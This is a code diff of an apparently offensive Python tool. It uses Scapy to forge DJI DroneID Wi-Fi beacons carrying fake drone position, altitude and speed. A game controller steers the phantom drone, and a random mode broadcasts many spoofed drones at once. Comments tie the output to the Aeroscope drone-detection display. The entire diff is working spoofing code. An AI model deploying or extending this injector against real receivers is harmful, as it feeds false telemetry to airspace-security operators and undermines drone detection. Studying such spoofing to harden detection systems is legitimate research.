@@ -3,14 +3,15 @@ import struct
 import sys, getopt, argparse
 from scapy.sendrecv import sendp, send
 import random, string
-from math import floor
+from math import floor, sqrt
 import jstest
-import time, os
+import time, os, calendar
 import threading
 from Drone import *
+from scapy.utils import PcapWriter
 
-
-
+MAX_TRIGGERS = 1023
+MAX_JXY = 32767
 
 
 '''
@@ -34,6 +35,8 @@ Update the DJI Vendor ID info from the Scapy Beacon object
 '''
 def update_packet(prev_packet, new_payload):
     
+    ts = calendar.timegm(time.gmtime())
+    prev_packet.timestamp = ts
     # New DJI Payload
     new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(new_payload) + 3,oui=0x263712, info = new_payload)
 
@@ -57,11 +60,18 @@ def thread_send(packet):
     while is_event == 0:
         count += 1
         try:
-            sendp(packet[1], iface=interface, verbose=0, loop=0, count=1)
-            time.sleep(0.3)
+            sendp(packet[1], iface=interface, verbose=0, loop=0, count=3)
+            time.sleep(1)
         except KeyboardInterrupt:
             break
+    time.sleep(0.1)
     print("Exiting Thread. Packet sent {} times".format(count))
+
+
+def normalize(value, max=MAX_TRIGGERS, minimum=1):
+    n = (value - minimum) / (max - minimum)
+    return n
+
 
 '''
 Single Drone Spoofing
@@ -111,20 +121,19 @@ def one_drone():
         drone.v_east = 0
         drone.v_north = 0
 
-        while 1:
-            updated = True
+        updated = True
+        while 1:      
             try:
                 # Start sending packets in a different thread since Joystick is blocking when waiting for events
-                send_thread = threading.Thread(target=thread_send, args=(packet_list,))
-                send_thread.start()
-                
+                if updated is True:
+                    send_thread = threading.Thread(target=thread_send, args=(packet_list,))
+                    send_thread.start()
+
+                updated = True  # Reset        
                 print("Waiting event")
                 events = joystick.gamepad._do_iter() # It blocks untl event is detected
-                
-                print("New Event. Exiting thread (main)")
+                print("New Event")
 
-                send_thread.join()
-                is_event = 0 # Reset
                 
                 #does not work still blocks...
                 if events is None or len(events) == 0:
@@ -132,66 +141,134 @@ def one_drone():
                     break
 
                 for event in events:
-                   
                     joystick.process_event(event)
-                    
-                    axis, value = joystick.axis, joystick.axis_value   # -1X , 1X, -1Y, 1Y, -1RX, -1RY
+                    axis, value = joystick.axis, joystick.axis_value
 
                     print("Event:  {} {}".format(axis, value))
-                    if axis == "X": # Modify Longitude
-                        print("Update longitude")
-                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value/ 1000))) # To modify the 4 decimal digit
-                        # Substitute payload bytes corresponding to the longitude
-                        drone.longitude_bytes = location2bytes(drone.longitude)
 
-                        drone.v_east =  (drone.v_east + 100 * value)  * value # All the time will increase the speed. 
-                        drone.v_north =  (drone.v_north - 50) if drone.v_north > 0 else drone.v_north + 50 # To reduce the speed on the other axis
+                    if axis is None and value == 0:
+                        # The event does not have any action assigned
+                        updated = False
+                        continue
+
+                    elif axis == "X": # Increase Longitude and speed according to value
+                        print("Update longitude")
+                        
+                        try:
+                            value_sign = float(value / abs(value)) #( -1 or 1)
+                        except ZeroDivisionError:
+                            updated = False
+                            continue
+
+                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value_sign/ 1000))) # To modify the 4 decimal digit
+
+                        new_speed = 25 * normalize (value, max=MAX_JXY)
+                        drone.v_east =  new_speed * 100 #ToDo check sign (drone.v_east + 100 * value)  * value # All the time will increase the speed. 
+       
 
                     elif axis == "Y": # Modify Latitude
                         print("Update latitude")
+                        try:
+                            value_sign = float(value / abs(value)) #( -1 or 1)
+                        except ZeroDivisionError:
+                            updated = False
+                            continue
                         
-                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value / 1000))) * (-1)
+                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value_sign / 1000))) * (-1) # invert sign: left should be positiv and right negative. Controller returns the other way
 
-                        # Substitute payload bytes corresponding to the latitude 
-                        drone.latitude_bytes = location2bytes(drone.latitude)
+                        new_speed = 25 * normalize (-value, max=MAX_JXY)
+                        drone.v_north =  new_speed * 100 #ToDo check sign 
 
-                        drone.v_north =  (drone.v_north +  (-value) * 50)  * value
+                    if axis == "HAT0X": # Modify Longitude
+                        print("Update longitude")
+
+                        if value == 0:
+                            updated = False # Released arrow
+                            continue
+
+                        # To modify the 4 decimal digit
+                        drone.longitude = drone.longitude +  float("{:.4f}".format(float(value/ 1000))) 
+                        drone.v_east =  (drone.v_east + 100 * value)   # All the time will increase the speed and the pointer will point to that direction
+                        drone.v_north =  (drone.v_north - 50) if drone.v_north > 0 else drone.v_north + 50 # To reduce the speed on the other axis
+                            
+
+                    elif axis == "HAT0Y": # Modify Latitude
+                        print("Update latitude")
+                        
+                        if value == 0:
+                            updated = False
+                            continue
+
+                        drone.latitude = drone.latitude + float("{:.4f}".format(float(value / 1000))) * (-1) # -1 because the value of the Y axis in XBOX controller is -1 for up and 1 for down. We want to increase latitude if we press up.
+                        drone.v_north =  (drone.v_north +  (-value) * 100)
                         drone.v_east =  (drone.v_east - 50) if drone.v_east > 0 else drone.v_east + 50
-
+                        
                     elif axis == "RY":
+                        print("Update altitude")
                        # Increase Altitude (and Vertical Speed)
                         # Minimum Altitude 0. ToDo limit upper boundary
+                        try:
+                            value_sign = float(value / abs(value)) #( -1 or 1)
+                            print("Altitude value sign {}".format(value_sign))
+                        except ZeroDivisionError:
+                            updated = False
+                            continue
                         if drone.altitude >= 0 and drone.altitude < 2**16-1:                       
-                            drone.altitude = drone.altitude + value * (-1) # Same reason. Axis value sign is inverted
+                            drone.altitude = drone.altitude + value_sign * (-1) # Same reason. Axis value sign is inverted
                             if drone.altitude <0:
                                 drone.altitude = 0
 
                     elif axis == "RX":
                         # modify yaw
-                        pass
+                        update = False
+                        continue
+                        
+
                    # Change speed to show 3 different colors.
                     elif axis == "TL" and value == 1: # Skip when button released event.
                         drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
                         drone.v_north = (drone.v_east + 200) % 2500
                         
                     elif axis == "Z": # Increase speed, both in X and Y axis
-                        drone.v_east = drone.v_east + 100 if drone.v_east > 0 else drone.v_east - 100
-                        drone.v_north = drone.v_north + 100 if drone.v_north > 0 else drone.v_north - 100
 
-                    elif axis == "RZ": # Decrease speed in both horizontal axis
-                        drone.v_east = drone.v_east - 100 if drone.v_east > 0 else drone.v_east + 100
-                        drone.v_north = drone.v_north - 100  if drone.v_north > 0 else drone.v_north + 100
+                        if value == 0: # If not pressed
+                            drone.v_north = 0
+                            drone.v_east = 0
 
-                    else:
-                        # The event does not have any action assigned
-                        updated = False
-                        continue
+                        # Consider if speed is in negative or positive
+                        elif value == MAX_TRIGGERS: # keep increasing
+                            drone.v_east = drone.v_east + 100 if drone.v_east > 0 else drone.v_east - 100
+                            drone.v_north = drone.v_north + 100 if drone.v_north > 0 else drone.v_north - 100
+                        
+                        else: # Speed is related to the value received. Lets normalize it until +-25
+                            new_speed = 25 * normalize (value) * 100 # speed multiplies 100 always
+                            drone.v_north = new_speed
+                            drone.v_east = new_speed
+                        
+                    elif axis == "MODE":
+                        if value == 0:
+                            updated = False
+                            continue
+                        drone.longitude, drone.latitude = drone.random_location()
+
+
+                    #elif axis == "RZ": # Decrease speed in both horizontal axis
+                     #   drone.v_east = drone.v_east - 100 if drone.v_east > 0 else drone.v_east + 100
+                      #  drone.v_north = drone.v_north - 100  if drone.v_north > 0 else drone.v_north + 100
 
                 if not updated:
                     # Thread keeps sending the same packet
                     print("Packet not updated")
                     # is_event = 0
                     continue
+
+                # Stop thread if packet is updated
+                updated = True
+                is_event = 1
+                print("Exiting thread (main). Join")
+                send_thread.join()
+                time.sleep(0.2)
+                print("Joined")
 
                 #Create new payload and update packet
                 new_payload = drone.build_telemetry()
@@ -209,7 +286,7 @@ def one_drone():
 
             print("Latitude: {} --- Longitude: {}".format(drone.latitude, drone.longitude))
             print("Altitude: {} ".format(drone.altitude))
-            print("Speed: {}".format(sqrt(drone.v_north **2 + drone.v_east **2)))
+            print("Speed: {}".format(sqrt(drone.v_north **2 + drone.v_east **2)/100))
 
 
     
@@ -249,6 +326,8 @@ def random_spoof(n, point=None):
         packet_list.append(telemetry_packet)
     
     print("=========All drones are ready ==================")
+    #pktdump = PcapWriter("telemetry.pcap", append=True, sync=True)
+    #pktdump.write(telemetry_packet)
     sendp(packet_list, iface=interface, loop=1, inter=2)
 
 
